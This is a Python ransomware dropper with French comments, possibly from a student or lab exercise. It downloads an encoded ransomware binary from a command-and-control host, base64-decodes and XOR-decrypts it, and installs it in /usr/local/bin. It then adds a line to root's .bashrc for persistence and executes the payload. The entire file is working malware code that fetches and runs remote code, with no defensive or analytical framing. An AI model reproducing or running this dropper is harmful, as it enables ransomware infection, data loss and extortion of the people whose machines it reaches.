import base64
import os
import requests
import subprocess
import sys
from xorcrypt import xorcrypt


CNC_ADDRESS = "cnc:6666"
OUTPUT_FILE = "/usr/local/bin/ransomware" 

BASHRC_PATH = "/root/.bashrc"
COMMAND = "\n/usr/local/bin/ransomware --decrypt\n"

def get_ransomware_from_cnc():
    url = f"http://{CNC_ADDRESS}/ransomware"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print("Erreur lors de la récupération du ransomware")
        sys.exit(1)

def decode_and_save_ransomware(encoded_ransomware: str, encoded_key: str):
    decoded_ransomware = base64.b64decode(encoded_ransomware)
    decoded_key = base64.b64decode(encoded_key)
    
    decrypted_ransomware = xorcrypt(decoded_ransomware, decoded_key)

    #create folder if not exist
    os.makedirs(os.path.dirname('usr/local/bin'), exist_ok=True)
    with open(OUTPUT_FILE, "wb") as f:
        f.write(decrypted_ransomware)

    os.chmod(OUTPUT_FILE, 0o755)  # Rendre le fichier exécutable

def main():
    cnc_response = get_ransomware_from_cnc()
    encoded_ransomware = cnc_response["data"]
    encoded_key = cnc_response["key"]
    decode_and_save_ransomware(encoded_ransomware, encoded_key)
    print("Ransomware téléchargé et décodé")

    # Ajouter une commande au fichier .bashrc si permission suffisante
    try:
        with open(BASHRC_PATH, "a") as bashrc_file:
            bashrc_file.write(COMMAND)
    except PermissionError:
        print("Permission denied. Impossible d'ajouter la commande au fichier .bashrc")
    # faire un liste contenant le chemin du fichier à éxécuter et un argument
    arguments = [OUTPUT_FILE, sys.argv[1]]
    # Lancer le ransomware installé
    subprocess.run(arguments)

if __name__ == "__main__":
    main()